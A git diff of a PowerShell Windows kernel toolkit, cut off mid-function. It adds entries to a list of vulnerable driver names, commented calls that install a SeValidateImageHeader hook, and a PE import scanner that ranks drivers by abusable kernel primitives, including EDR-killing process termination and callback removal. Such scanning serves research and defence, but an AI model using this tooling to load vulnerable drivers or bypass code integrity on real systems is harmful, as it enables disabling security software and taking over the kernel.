@@ -65,7 +65,8 @@ using namespace System.Windows.Forms
             "ArgusMonitorCTL", "ProcessCtr", "GGProtect64", "GGProtect",
             "ksapi", "ksapi64_dev", "PDFWKRNL", "TPwSav", "WDTKernel",
             "EBIoDispatch", "CcProtect", "EnPortv", "xkpsm", "pcdsrvc_x64",
-            "AsrDrv107", "Pmxdrv", "pmxdrv64", "MyPortIO_x64", "MyPortIO0"
+            "AsrDrv107", "Pmxdrv", "pmxdrv64", "MyPortIO_x64", "MyPortIO0",
+            "athpexnt", "MonProcessEX"
 
  $Binary | % {
     $DriverPath = Join-Path -Path $SourceDir -ChildPath "$_.sys"
@@ -202,6 +203,18 @@ if ($g_CiOptions -ne $null) {
 }
 #>
 
+# SeValidateImageHeaderHook
+<#
+Clear-Host
+Write-Host
+
+Invoke-SeValidateImageHeaderHook -Install
+Write-Host
+
+Invoke-SeValidateImageHeaderHook -Remove
+Write-Host
+#>
+
 # NT Build Number
 <#
 Spoof-NtBuildNumber
@@ -216,6 +229,914 @@ Spoof-NtBuildNumber -NewBuildNumber 26000 -SpoofLevel KUser
 # Read-VirtualAddress -VA (Get-DriverAddress ??) -BlockSize 8 | Format-HexView -Mode 8x
 
 #region Base
+# Scan Kernel Drivers
+if (!([PSTypeName]'PE').Type) {
+$code = @"
+using System;
+using System.Runtime.InteropServices;
+
+public class PE
+{
+    [Flags]
+    public enum IMAGE_DOS_SIGNATURE : ushort
+    {
+        DOS_SIGNATURE = 0x5A4D, // MZ
+        OS2_SIGNATURE = 0x454E, // NE
+        OS2_SIGNATURE_LE = 0x454C, // LE
+        VXD_SIGNATURE = 0x454C, // LE
+    }
+        
+    [Flags]
+    public enum IMAGE_NT_SIGNATURE : uint
+    {
+        VALID_PE_SIGNATURE = 0x00004550 // PE00
+    }
+        
+    [Flags]
+    public enum IMAGE_FILE_MACHINE : ushort
+    {
+        UNKNOWN = 0,
+        I386 = 0x014c, // Intel 386.
+        R3000 = 0x0162, // MIPS little-endian =0x160 big-endian
+        R4000 = 0x0166, // MIPS little-endian
+        R10000 = 0x0168, // MIPS little-endian
+        WCEMIPSV2 = 0x0169, // MIPS little-endian WCE v2
+        ALPHA = 0x0184, // Alpha_AXP
+        SH3 = 0x01a2, // SH3 little-endian
+        SH3DSP = 0x01a3,
+        SH3E = 0x01a4, // SH3E little-endian
+        SH4 = 0x01a6, // SH4 little-endian
+        SH5 = 0x01a8, // SH5
+        ARM = 0x01c0, // ARM Little-Endian
+        THUMB = 0x01c2,
+        ARMNT = 0x01c4, // ARM Thumb-2 Little-Endian
+        AM33 = 0x01d3,
+        POWERPC = 0x01F0, // IBM PowerPC Little-Endian
+        POWERPCFP = 0x01f1,
+        IA64 = 0x0200, // Intel 64
+        MIPS16 = 0x0266, // MIPS
+        ALPHA64 = 0x0284, // ALPHA64
+        MIPSFPU = 0x0366, // MIPS
+        MIPSFPU16 = 0x0466, // MIPS
+        AXP64 = ALPHA64,
+        TRICORE = 0x0520, // Infineon
+        CEF = 0x0CEF,
+        EBC = 0x0EBC, // EFI public byte Code
+        AMD64 = 0x8664, // AMD64 (K8)
+        M32R = 0x9041, // M32R little-endian
+        CEE = 0xC0EE
+    }
+        
+    [Flags]
+    public enum IMAGE_FILE_CHARACTERISTICS : ushort
+    {
+        IMAGE_RELOCS_STRIPPED = 0x0001, // Relocation info stripped from file.
+        IMAGE_EXECUTABLE_IMAGE = 0x0002, // File is executable (i.e. no unresolved external references).
+        IMAGE_LINE_NUMS_STRIPPED = 0x0004, // Line nunbers stripped from file.
+        IMAGE_LOCAL_SYMS_STRIPPED = 0x0008, // Local symbols stripped from file.
+        IMAGE_AGGRESIVE_WS_TRIM = 0x0010, // Agressively trim working set
+        IMAGE_LARGE_ADDRESS_AWARE = 0x0020, // App can handle >2gb addresses
+        IMAGE_REVERSED_LO = 0x0080, // public bytes of machine public ushort are reversed.
+        IMAGE_32BIT_MACHINE = 0x0100, // 32 bit public ushort machine.
+        IMAGE_DEBUG_STRIPPED = 0x0200, // Debugging info stripped from file in .DBG file
+        IMAGE_REMOVABLE_RUN_FROM_SWAP = 0x0400, // If Image is on removable media =copy and run from the swap file.
+        IMAGE_NET_RUN_FROM_SWAP = 0x0800, // If Image is on Net =copy and run from the swap file.
+        IMAGE_SYSTEM = 0x1000, // System File.
+        IMAGE_DLL = 0x2000, // File is a DLL.
+        IMAGE_UP_SYSTEM_ONLY = 0x4000, // File should only be run on a UP machine
+        IMAGE_REVERSED_HI = 0x8000 // public bytes of machine public ushort are reversed.
+    }
+        
+    [Flags]
+    public enum IMAGE_NT_OPTIONAL_HDR_MAGIC : ushort
+    {
+        PE32 = 0x10b,
+        PE64 = 0x20b
+    }
+        
+    [Flags]
+    public enum IMAGE_SUBSYSTEM : ushort
+    {
+        UNKNOWN = 0, // Unknown subsystem.
+        NATIVE = 1, // Image doesn't require a subsystem.
+        WINDOWS_GUI = 2, // Image runs in the Windows GUI subsystem.
+        WINDOWS_CUI = 3, // Image runs in the Windows character subsystem.
+        OS2_CUI = 5, // image runs in the OS/2 character subsystem.
+        POSIX_CUI = 7, // image runs in the Posix character subsystem.
+        NATIVE_WINDOWS = 8, // image is a native Win9x driver.
+        WINDOWS_CE_GUI = 9, // Image runs in the Windows CE subsystem.
+        EFI_APPLICATION = 10,
+        EFI_BOOT_SERVICE_DRIVER = 11,
+        EFI_RUNTIME_DRIVER = 12,
+        EFI_ROM = 13,
+        XBOX = 14,
+        WINDOWS_BOOT_APPLICATION = 16
+    }
+        
+    [Flags]
+    public enum IMAGE_DLLCHARACTERISTICS : ushort
+    {
+        DYNAMIC_BASE = 0x0040, // DLL can move.
+        FORCE_INTEGRITY = 0x0080, // Code Integrity Image
+        NX_COMPAT = 0x0100, // Image is NX compatible
+        NO_ISOLATION = 0x0200, // Image understands isolation and doesn't want it
+        NO_SEH = 0x0400, // Image does not use SEH. No SE handler may reside in this image
+        NO_BIND = 0x0800, // Do not bind this image.
+        WDM_DRIVER = 0x2000, // Driver uses WDM model
+        TERMINAL_SERVER_AWARE = 0x8000
+    }
+        
+    [Flags]
+    public enum IMAGE_SCN : uint
+    {
+        TYPE_NO_PAD = 0x00000008, // Reserved.
+        CNT_CODE = 0x00000020, // Section contains code.
+        CNT_INITIALIZED_DATA = 0x00000040, // Section contains initialized data.
+        CNT_UNINITIALIZED_DATA = 0x00000080, // Section contains uninitialized data.
+        LNK_INFO = 0x00000200, // Section contains comments or some other type of information.
+        LNK_REMOVE = 0x00000800, // Section contents will not become part of image.
+        LNK_COMDAT = 0x00001000, // Section contents comdat.
+        NO_DEFER_SPEC_EXC = 0x00004000, // Reset speculative exceptions handling bits in the TLB entries for this section.
+        GPREL = 0x00008000, // Section content can be accessed relative to GP
+        MEM_FARDATA = 0x00008000,
+        MEM_PURGEABLE = 0x00020000,
+        MEM_16BIT = 0x00020000,
+        MEM_LOCKED = 0x00040000,
+        MEM_PRELOAD = 0x00080000,
+        ALIGN_1BYTES = 0x00100000,
+        ALIGN_2BYTES = 0x00200000,
+        ALIGN_4BYTES = 0x00300000,
+        ALIGN_8BYTES = 0x00400000,
+        ALIGN_16BYTES = 0x00500000, // Default alignment if no others are specified.
+        ALIGN_32BYTES = 0x00600000,
+        ALIGN_64BYTES = 0x00700000,
+        ALIGN_128BYTES = 0x00800000,
+        ALIGN_256BYTES = 0x00900000,
+        ALIGN_512BYTES = 0x00A00000,
+        ALIGN_1024BYTES = 0x00B00000,
+        ALIGN_2048BYTES = 0x00C00000,
+        ALIGN_4096BYTES = 0x00D00000,
+        ALIGN_8192BYTES = 0x00E00000,
+        ALIGN_MASK = 0x00F00000,
+        LNK_NRELOC_OVFL = 0x01000000, // Section contains extended relocations.
+        MEM_DISCARDABLE = 0x02000000, // Section can be discarded.
+        MEM_NOT_CACHED = 0x04000000, // Section is not cachable.
+        MEM_NOT_PAGED = 0x08000000, // Section is not pageable.
+        MEM_SHARED = 0x10000000, // Section is shareable.
+        MEM_EXECUTE = 0x20000000, // Section is executable.
+        MEM_READ = 0x40000000, // Section is readable.
+        MEM_WRITE = 0x80000000 // Section is writeable.
+    }
+    
+    [StructLayout(LayoutKind.Sequential, Pack=1)]
+    public struct _IMAGE_DOS_HEADER
+    {
+        public IMAGE_DOS_SIGNATURE e_magic; // Magic number
+        public ushort e_cblp; // public bytes on last page of file
+        public ushort e_cp; // Pages in file
+        public ushort e_crlc; // Relocations
+        public ushort e_cparhdr; // Size of header in paragraphs
+        public ushort e_minalloc; // Minimum extra paragraphs needed
+        public ushort e_maxalloc; // Maximum extra paragraphs needed
+        public ushort e_ss; // Initial (relative) SS value
+        public ushort e_sp; // Initial SP value
+        public ushort e_csum; // Checksum
+        public ushort e_ip; // Initial IP value
+        public ushort e_cs; // Initial (relative) CS value
+        public ushort e_lfarlc; // File address of relocation table
+        public ushort e_ovno; // Overlay number
+        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 8)]
+        public string e_res; // This will contain 'Detours!' if patched in memory
+        public ushort e_oemid; // OEM identifier (for e_oeminfo)
+        public ushort e_oeminfo; // OEM information; e_oemid specific
+        [MarshalAsAttribute(UnmanagedType.ByValArray, SizeConst=10)] // , ArraySubType=UnmanagedType.U4
+        public ushort[] e_res2; // Reserved public ushorts
+        public int e_lfanew; // File address of new exe header
+    }
+        
+    [StructLayout(LayoutKind.Sequential, Pack=1)]
+    public struct _IMAGE_FILE_HEADER
+    {
+        public IMAGE_FILE_MACHINE Machine;
+        public ushort NumberOfSections;
+        public uint TimeDateStamp;
+        public uint PointerToSymbolTable;
+        public uint NumberOfSymbols;
+        public ushort SizeOfOptionalHeader;
+        public IMAGE_FILE_CHARACTERISTICS Characteristics;
+    }
+        
+    [StructLayout(LayoutKind.Sequential, Pack=1)]
+    public struct _IMAGE_NT_HEADERS32
+    {
+        public IMAGE_NT_SIGNATURE Signature;
+        public _IMAGE_FILE_HEADER FileHeader;
+        public _IMAGE_OPTIONAL_HEADER32 OptionalHeader;
+    }
+        
+    [StructLayout(LayoutKind.Sequential, Pack=1)]
+    public struct _IMAGE_NT_HEADERS64
+    {
+        public IMAGE_NT_SIGNATURE Signature;
+        public _IMAGE_FILE_HEADER FileHeader;
+        public _IMAGE_OPTIONAL_HEADER64 OptionalHeader;
+    }
+        
+    [StructLayout(LayoutKind.Sequential, Pack=1)]
+    public struct _IMAGE_OPTIONAL_HEADER32
+    {
+        public IMAGE_NT_OPTIONAL_HDR_MAGIC Magic;
+        public byte MajorLinkerVersion;
+        public byte MinorLinkerVersion;
+        public uint SizeOfCode;
+        public uint SizeOfInitializedData;
+        public uint SizeOfUninitializedData;
+        public uint AddressOfEntryPoint;
+        public uint BaseOfCode;
+        public uint BaseOfData;
+        public uint ImageBase;
+        public uint SectionAlignment;
+        public uint FileAlignment;
+        public ushort MajorOperatingSystemVersion;
+        public ushort MinorOperatingSystemVersion;
+        public ushort MajorImageVersion;
+        public ushort MinorImageVersion;
+        public ushort MajorSubsystemVersion;
+        public ushort MinorSubsystemVersion;
+        public uint Win32VersionValue;
+        public uint SizeOfImage;
+        public uint SizeOfHeaders;
+        public uint CheckSum;
+        public IMAGE_SUBSYSTEM Subsystem;
+        public IMAGE_DLLCHARACTERISTICS DllCharacteristics;
+        public uint SizeOfStackReserve;
+        public uint SizeOfStackCommit;
+        public uint SizeOfHeapReserve;
+        public uint SizeOfHeapCommit;
+        public uint LoaderFlags;
+        public uint NumberOfRvaAndSizes;
+        [MarshalAsAttribute(UnmanagedType.ByValArray, SizeConst=16)]
+        public _IMAGE_DATA_DIRECTORY[] DataDirectory;
+    }
+        
+    [StructLayout(LayoutKind.Sequential, Pack=1)]
+    public struct _IMAGE_OPTIONAL_HEADER64
+    {
+        public IMAGE_NT_OPTIONAL_HDR_MAGIC Magic;
+        public byte MajorLinkerVersion;
+        public byte MinorLinkerVersion;
+        public uint SizeOfCode;
+        public uint SizeOfInitializedData;
+        public uint SizeOfUninitializedData;
+        public uint AddressOfEntryPoint;
+        public uint BaseOfCode;
+        public ulong ImageBase;
+        public uint SectionAlignment;
+        public uint FileAlignment;
+        public ushort MajorOperatingSystemVersion;
+        public ushort MinorOperatingSystemVersion;
+        public ushort MajorImageVersion;
+        public ushort MinorImageVersion;
+        public ushort MajorSubsystemVersion;
+        public ushort MinorSubsystemVersion;
+        public uint Win32VersionValue;
+        public uint SizeOfImage;
+        public uint SizeOfHeaders;
+        public uint CheckSum;
+        public IMAGE_SUBSYSTEM Subsystem;
+        public IMAGE_DLLCHARACTERISTICS DllCharacteristics;
+        public ulong SizeOfStackReserve;
+        public ulong SizeOfStackCommit;
+        public ulong SizeOfHeapReserve;
+        public ulong SizeOfHeapCommit;
+        public uint LoaderFlags;
+        public uint NumberOfRvaAndSizes;
+        [MarshalAsAttribute(UnmanagedType.ByValArray, SizeConst=16)]
+        public _IMAGE_DATA_DIRECTORY[] DataDirectory;
+    }
+        
+    [StructLayout(LayoutKind.Sequential, Pack=1)]
+    public struct _IMAGE_DATA_DIRECTORY
+    {
+        public uint VirtualAddress;
+        public uint Size;
+    }
+        
+    [StructLayout(LayoutKind.Sequential, Pack=1)]
+    public struct _IMAGE_EXPORT_DIRECTORY
+    {
+        public uint Characteristics;
+        public uint TimeDateStamp;
+        public ushort MajorVersion;
+        public ushort MinorVersion;
+        public uint Name;
+        public uint Base;
+        public uint NumberOfFunctions;
+        public uint NumberOfNames;
+        public uint AddressOfFunctions; // RVA from base of image
+        public uint AddressOfNames; // RVA from base of image
+        public uint AddressOfNameOrdinals; // RVA from base of image
+    }
+       
+    [StructLayout(LayoutKind.Sequential, Pack=1)]
+    public struct _IMAGE_SECTION_HEADER
+    {
+        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 8)]
+        public string Name;
+        public uint VirtualSize;
+        public uint VirtualAddress;
+        public uint SizeOfRawData;
+        public uint PointerToRawData;
+        public uint PointerToRelocations;
+        public uint PointerToLinenumbers;
+        public ushort NumberOfRelocations;
+        public ushort NumberOfLinenumbers;
+        public IMAGE_SCN Characteristics;
+    }
+        
+    [StructLayout(LayoutKind.Sequential, Pack=1)]
+    public struct _IMAGE_IMPORT_DESCRIPTOR
+    {
+        public uint OriginalFirstThunk; // RVA to original unbound IAT (PIMAGE_THUNK_DATA)
+        public uint TimeDateStamp; // 0 if not bound,
+                                            // -1 if bound, and real date/time stamp
+                                            // in IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT (new BIND)
+                                            // O.W. date/time stamp of DLL bound to (Old BIND)
+        public uint ForwarderChain; // -1 if no forwarders
+        public uint Name;
+        public uint FirstThunk; // RVA to IAT (if bound this IAT has actual addresses)
+    }
+
+    [StructLayout(LayoutKind.Sequential, Pack=1)]
+    public struct _IMAGE_THUNK_DATA32
+    {
+        public Int32 AddressOfData; // PIMAGE_IMPORT_BY_NAME
+    }
+
+    [StructLayout(LayoutKind.Sequential, Pack=1)]
+    public struct _IMAGE_THUNK_DATA64
+    {
+        public Int64 AddressOfData; // PIMAGE_IMPORT_BY_NAME
+    }
+        
+    [StructLayout(LayoutKind.Sequential, Pack=1)]
+    public struct _IMAGE_IMPORT_BY_NAME
+    {
+        public ushort Hint;
+        public char Name;
+    }
+}
+"@
+
+$compileParams = New-Object System.CodeDom.Compiler.CompilerParameters
+$compileParams.ReferencedAssemblies.AddRange(@('System.dll', 'mscorlib.dll'))
+$compileParams.GenerateInMemory = $True
+Add-Type -TypeDefinition $code -CompilerParameters $compileParams -PassThru -WarningAction SilentlyContinue | Out-Null
+}
+function Get-DriverImports {
+    [CmdletBinding()]
+    param (
+        [Parameter(Mandatory = $true)]
+        [string]$DllName
+    )
+
+    function Convert-RVAToFileOffset([int64]$Rva, [PSObject[]]$SectionHeaders) {
+        foreach ($Section in $SectionHeaders) {
+            $SecVA   = [int64][uint32]$Section.VirtualAddress
+            $SecSize = [int64][uint32]$Section.VirtualSize
+            $RawPtr  = [int64][uint32]$Section.PointerToRawData
+
+            if ($Rva -ge $SecVA -and $Rva -lt ($SecVA + $SecSize)) {
+                return $Rva - $SecVA + $RawPtr
+            }
+        }
+        return $Rva
+    }
+
+    $DllPath = $DllName
+    if (-not (Test-Path $DllPath)) {
+        $DllPath = Join-Path -Path $env:windir -ChildPath "System32\$DllName"
+    }
+
+    if (-not (Test-Path $DllPath)) {
+        Write-Error "DLL file not found at: $DllPath"
+        return $null
+    }
+
+    $FileByteArray = [System.IO.File]::ReadAllBytes($DllPath)
+    $Handle = [GCHandle]::Alloc($FileByteArray, 'Pinned')
+    $PEBaseAddr = $Handle.AddrOfPinnedObject()
+
+    $ImportList = [System.Collections.Generic.List[PSCustomObject]]::new()
+
+    try {
+        # 1. Parse DOS Header
+        $DosHeader = [Marshal]::PtrToStructure($PEBaseAddr, [Type] [PE+_IMAGE_DOS_HEADER])
+        $NtHeaderLong = $PEBaseAddr.ToInt64() + $DosHeader.e_lfanew
+        $PointerNtHeader = [IntPtr]$NtHeaderLong
+
+        # 2. Detect Architecture & Select Struct
+        $NtHeader32 = [Marshal]::PtrToStructure($PointerNtHeader, [Type] [PE+_IMAGE_NT_HEADERS32])
+        $Architecture = $NtHeader32.FileHeader.Machine.ToString()
+        
+        $Is64Bit = $false
+        if ($Architecture -eq 'AMD64' -or $Architecture -eq '267' -or $Architecture -eq '0x8664') {
+            $NtHeaderType = [PE+_IMAGE_NT_HEADERS64]
+            $Is64Bit = $true
+        } elseif ($Architecture -eq 'I386' -or $Architecture -eq '332' -or $Architecture -eq '0x014c') {
+            $NtHeaderType = [PE+_IMAGE_NT_HEADERS32]
+        } else {
+            Write-Error "Unsupported architecture: $Architecture"
+            return $null
+        }
+
+        # Parse correct NT header
+        $NtHeader = [Marshal]::PtrToStructure($PointerNtHeader, [Type] $NtHeaderType)
+        $NumSections = $NtHeader.FileHeader.NumberOfSections
+
+        # Explicit Section Header Calculation
+        $SizeOfOptionalHeader = $NtHeader.FileHeader.SizeOfOptionalHeader
+        $PointerSectionHeader = [IntPtr]($NtHeaderLong + 4 + 20 + $SizeOfOptionalHeader)
+
+        # 3. Parse Section Headers
+        $SectionHeaders = New-Object PSObject[]($NumSections)
+        $SectionHeaderSize = [Marshal]::SizeOf([Type] [PE+_IMAGE_SECTION_HEADER])
+        for ($i = 0; $i -lt $NumSections; $i++) {
+            $SectionHeaders[$i] = [Marshal]::PtrToStructure(
+                [IntPtr]($PointerSectionHeader.ToInt64() + ($i * $SectionHeaderSize)),
+                [Type] [PE+_IMAGE_SECTION_HEADER]
+            )
+        }
+
+        # 4. Check for Import Data Directory (Index 1)
+        $ImportDirRVA = [int64][uint32]$NtHeader.OptionalHeader.DataDirectory[1].VirtualAddress
+        if ($ImportDirRVA -eq 0) {
+            Write-Warning "Module does not contain an Import Directory."
+            return @()
+        }
+
+        $ImportDirOffset = Convert-RVAToFileOffset -Rva $ImportDirRVA -SectionHeaders $SectionHeaders
+        $DescriptorSize = [Marshal]::SizeOf([Type][PE+_IMAGE_IMPORT_DESCRIPTOR])
+        $CurrentImportDescriptorOffset = $ImportDirOffset
+
+        # Loop through each dependency block (Import Descriptor)
+        while ($true) {
+            if ($CurrentImportDescriptorOffset -ge $FileByteArray.Length) { break }
+
+            $DescriptorPtr = [IntPtr]($PEBaseAddr.ToInt64() + $CurrentImportDescriptorOffset)
+            $ImportDescriptor = [Marshal]::PtrToStructure($DescriptorPtr, [Type][PE+_IMAGE_IMPORT_DESCRIPTOR])
+
+            # End of Import Table marker
+            if ($ImportDescriptor.Characteristics -eq 0 -and $ImportDescriptor.Name -eq 0 -and $ImportDescriptor.FirstThunk -eq 0) {
+                break
+            }
+            if ($ImportDescriptor.Name -eq 0) { break }
+
+            # Resolve dependent DLL name
+            $NameRva = [int64][uint32]$ImportDescriptor.Name
+            $ImportedDllNameOffset = Convert-RVAToFileOffset -Rva $NameRva -SectionHeaders $SectionHeaders
+            $ImportedDllName = [Marshal]::PtrToStringAnsi([IntPtr]($PEBaseAddr.ToInt64() + $ImportedDllNameOffset))
+
+            # FIX: Explicitly check OriginalFirstThunk (Characteristics). If 0, use FirstThunk.
+            # This protects against reading garbage metadata strings outside the IAT.
+            $ThunkRVA = [int64][uint32]$ImportDescriptor.Characteristics
+            if ($ThunkRVA -eq 0) {
+                $ThunkRVA = [int64][uint32]$ImportDescriptor.FirstThunk
+            }
+
+            if ($ThunkRVA -eq 0) {
+                $CurrentImportDescriptorOffset += $DescriptorSize
+                continue
+            }
+
+            $ThunkOffset = Convert-RVAToFileOffset -Rva $ThunkRVA -SectionHeaders $SectionHeaders
+            $ThunkSize = if ($Is64Bit) { 8 } else { 4 }
+            $CurrentThunkOffset = $ThunkOffset
+
+            # Inner loop: Collect functions for this module block
+            while ($true) {
+                if ($CurrentThunkOffset -ge $FileByteArray.Length) { break }
+
+                $ThunkValue = if ($Is64Bit) {
+                    [Marshal]::ReadInt64([IntPtr]($PEBaseAddr.ToInt64() + $CurrentThunkOffset))
+                } else {
+                    [Marshal]::ReadInt32([IntPtr]($PEBaseAddr.ToInt64() + $CurrentThunkOffset))
+                }
+
+                if ($ThunkValue -eq 0) { break }
+
+                # Check if imported by Ordinal vs Named String
+                $OrdinalBitMask = if ($Is64Bit) { [Int64]::MinValue } else { [Int32]::MinValue }
+                if (($ThunkValue -band $OrdinalBitMask) -eq 0) {
+                    
+                    $SafeRva = [int64]($ThunkValue -band 0x7FFFFFFF)
+                    $NameStructOffset = Convert-RVAToFileOffset -Rva $SafeRva -SectionHeaders $SectionHeaders
+                    
+                    if ($NameStructOffset -lt $FileByteArray.Length) {
+                        # +2 skips the structural Hint word inside the IMAGE_IMPORT_BY_NAME record
+                        $ImportedFuncName = [Marshal]::PtrToStringAnsi([IntPtr]($PEBaseAddr.ToInt64() + $NameStructOffset + 2))
+
+                        if (-not [string]::IsNullOrEmpty($ImportedFuncName)) {
+                            $ImportList.Add([PSCustomObject]@{
+                                ImportedFunction = $ImportedFuncName
+                                SourceModule     = $ImportedDllName
+                                ImportType       = "Name"
+                            })
+                        }
+                    }
+                } else {
+                    $OrdinalValue = $ThunkValue -band 0xFFFF
+                    $ImportList.Add([PSCustomObject]@{
+                        ImportedFunction = "Ordinal_$OrdinalValue"
+                        SourceModule     = $ImportedDllName
+                        ImportType       = "Ordinal"
+                    })
+                }
+
+                $CurrentThunkOffset += $ThunkSize
+            }
+
+            $CurrentImportDescriptorOffset += $DescriptorSize
+        }
+
+        return $ImportList
+
+    } finally {
+        if ($Handle -and $Handle.IsAllocated) {
+            $Handle.Free()
+        }
+    }
+}
+function Scan-DriverPrimitive {
+    [CmdletBinding()]
+    param (
+        [Parameter(Mandatory = $false, Position = 0)]
+        [string]$CustomPath,
+
+        [Parameter(Mandatory = $false, Position = 1)]
+        [switch]$System32,
+
+        [Parameter(Mandatory = $false, Position = 2)]
+        [switch]$Drivers,
+
+        [Parameter(Mandatory = $false, Position = 3)]
+        [switch]$ProgramFiles,
+
+        [Parameter(Mandatory = $false, Position = 4)]
+        [switch]$NoRecurse,
+
+        [Parameter(Mandatory = $false, Position = 5)]
+        [switch]$IncludeAll,
+
+        [Parameter(Mandatory = $false, Position = 6)]
+        [switch]$ValidateLolDrivers,
+
+        [Parameter(Mandatory = $false, Position = 7)]
+        [switch]$ValidateMSBlockPolicy,
+
+        [Parameter(Mandatory = $false, Position = 8)]
+        [ValidateSet('Basic', 'Extended')]
+        [string]$ScanMode = 'Basic',
+
+        [Parameter(Mandatory = $false, Position = 9)]
+        [ValidateRange(0, 10)]
+        [int]$MinThreatLevel = 4
+    )
+
+    begin {
+        # Force TLS 1.2/1.3 for secure downloads
+        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls13
+
+        # --- SHORTER LIST (The Most Commonly Attacked Primitives + Process Termination) ---
+        $BasicList = @(
+            # Physical Memory Mapping (The #1 target for arbitrary read/write)
+            "MmMapIoSpace", "MmMapIoSpaceEx", "ZwMapViewOfSection", "NtMapViewOfSection",
+            
+            # Kernel Memory Copying / Manipulation (Direct exploitation targets)
+            "MmCopyVirtualMemory", "MmCopyMemory",
+            
+            # CPU Control & Register Tampering (Used to hijack kernel control flow / bypass KASLR)
+            "__readmsr", "__writemsr", "__writecr3", "__writecr4",
+
+            # Process Termination (Abused to forcibly kill security agents/EDRs from Ring 0)
+            "ZwTerminateProcess", "NtTerminateProcess",
+
+            #Misc
+            "MmGetSystemRoutineAddress"
+        )
+
+        # --- EXTENDED LIST (Auxiliary, Allocation, and Rootkit-Style Callbacks) ---
+        $ExtendedExtensions = @(
+            # Memory allocation & advanced mapping variants
+            "MmMapLockedPages", "MmMapLockedPagesSpecifyCache", "MmMapLockedPagesWithReservedMapping",
+            "MmMapUserAddressesToPageDirectory", "MmAllocateMappingAddress", "MmFreeMappingAddress",
+            "MmMapVideoDisplay", "MmUnmapVideoDisplay", "ExAllocatePool", "ExAllocatePoolWithTag", "ExAllocatePool2",
+            
+            # Address resolution & hardware pointer lookups
+            "MmGetPhysicalAddress", "MmGetVirtualForPhysical", "MmGetPhysicalMemoryRanges",
+            "MmIsAddressValid", "MmAllocatePagesForMdlEx", "ObReferenceObjectByName", "IoGetDeviceObjectPointer",
+            "ObOpenObjectByPointer", "ObReferenceObjectByHandle",
+
+            # Direct hardware port input/output
+            "READ_PORT_UCHAR", "READ_PORT_USHORT", "READ_PORT_ULONG",
+            "WRITE_PORT_UCHAR", "WRITE_PORT_USHORT", "WRITE_PORT_ULONG",
+            "READ_PORT_BUFFER_UCHAR", "READ_PORT_BUFFER_USHORT", "READ_PORT_BUFFER_ULONG",
+            "WRITE_PORT_BUFFER_UCHAR", "WRITE_PORT_BUFFER_USHORT", "WRITE_PORT_BUFFER_ULONG",
+
+            # Remaining CPU Control Registers
+            "__readcr0", "__writecr0", "__readcr2", "__writecr2", "__readcr8", "__writecr8",
+
+            # Process/Thread Manipulation & Lookups (Excluding the core termination APIs)
+            "ZwOpenProcess", "PsLookupProcessByProcessId", "ZwTerminateThread", "PsTerminateSystemThread", "PsLookupThreadByThreadId",
+
+            # EDR / Security Callback Stripping (Rootkit/Blinding Behaviors)
+            "CmUnRegisterCallback", "ObUnRegisterCallbacks", 
+            "PsSetCreateProcessNotifyRoutine", "PsSetCreateProcessNotifyRoutineEx",
+            "PsSetCreateThreadNotifyRoutine", "PsSetLoadImageNotifyRoutine"
+        )
+
+        # Build target array based on selected Mode
+        $SelectedArray = switch ($ScanMode) {
+            'Basic'    { $BasicList }
+            'Extended' { $BasicList + $ExtendedExtensions }
+        }
+
+        # --- SCORING WEIGHTS ENGINE (10 = Worst, 1 = OK) ---
+        $ScoringEngine = @{
+            # Physical Memory Mapping & User Space Exposure
+            "MmMapIoSpace" = 10; "MmMapIoSpaceEx" = 10; "ZwMapViewOfSection" = 10; "NtMapViewOfSection" = 10;
+            "MmMapLockedPages" = 10; "MmMapLockedPagesSpecifyCache" = 10; "MmMapLockedPagesWithReservedMapping" = 10;
+            "MmMapUserAddressesToPageDirectory" = 10; "MmMapVideoDisplay" = 10;
+
+            # Process Termination & EDR Callback Disabling
+            "ZwTerminateProcess" = 10; "NtTerminateProcess" = 10;
+            "CmUnRegisterCallback" = 10; "ObUnRegisterCallbacks" = 10;
+
+            # CPU Control & Register Writes (Hijacking Kernel Flow)
+            "__writemsr" = 9; "__writecr3" = 9; "__writecr4" = 9; "__writecr0" = 9; "__writecr2" = 9; "__writecr8" = 9;
+
+            # Memory Manipulation / Reading & Copying Virtual Space
+            "MmCopyVirtualMemory" = 8; "MmCopyMemory" = 8;
+
+            # Direct Hardware Port Access / Outbound Writes
+            "WRITE_PORT_UCHAR" = 7; "WRITE_PORT_USHORT" = 7; "WRITE_PORT_ULONG" = 7;
+            "WRITE_PORT_BUFFER_UCHAR" = 7; "WRITE_PORT_BUFFER_USHORT" = 7; "WRITE_PORT_BUFFER_ULONG" = 7;
+            "READ_PORT_UCHAR" = 6; "READ_PORT_USHORT" = 6; "READ_PORT_ULONG" = 6;
+            "READ_PORT_BUFFER_UCHAR" = 6; "READ_PORT_BUFFER_USHORT" = 6; "READ_PORT_BUFFER_ULONG" = 6;
+            "__readmsr" = 6; "__readcr0" = 6; "__readcr2" = 6; "__readcr8" = 6;
+
+            # Threat / Process & Thread Monitoring Manipulation
+            "ZwTerminateThread" = 5; "PsTerminateSystemThread" = 5;
+            "PsSetCreateProcessNotifyRoutine" = 5; "PsSetCreateProcessNotifyRoutineEx" = 5;
+            "PsSetCreateThreadNotifyRoutine" = 5; "PsSetLoadImageNotifyRoutine" = 5;
+
+            # API Resolvers & Open Handle Lookups
+            "MmGetSystemRoutineAddress" = 4; "ObReferenceObjectByName" = 4; "IoGetDeviceObjectPointer" = 4;
+            "ObOpenObjectByPointer" = 4; "ObReferenceObjectByHandle" = 4; "PsLookupProcessByProcessId" = 4;
+            "PsLookupThreadByThreadId" = 4; "ZwOpenProcess" = 4;
+
+            # Memory Allocation & Information Queries
+            "ExAllocatePool" = 2; "ExAllocatePoolWithTag" = 2; "ExAllocatePool2" = 2;
+            "MmGetPhysicalAddress" = 2; "MmGetVirtualForPhysical" = 2; "MmGetPhysicalMemoryRanges" = 2;
+            "MmIsAddressValid" = 2; "MmAllocatePagesForMdlEx" = 2; "MmAllocateMappingAddress" = 2;
+            "MmFreeMappingAddress" = 2; "MmUnmapVideoDisplay" = 2;
+        }
+
+        $BYOVDPrimitives = [System.Collections.Generic.HashSet[string]]::new(
+            [string[]]$SelectedArray, 
+            [System.StringComparer]::OrdinalIgnoreCase
+        )
+
+        # --- LOLDrivers API Integration ---
+        $LolHashes = [System.Collections.Generic.HashSet[string]]::new([System.StringComparer]::OrdinalIgnoreCase)
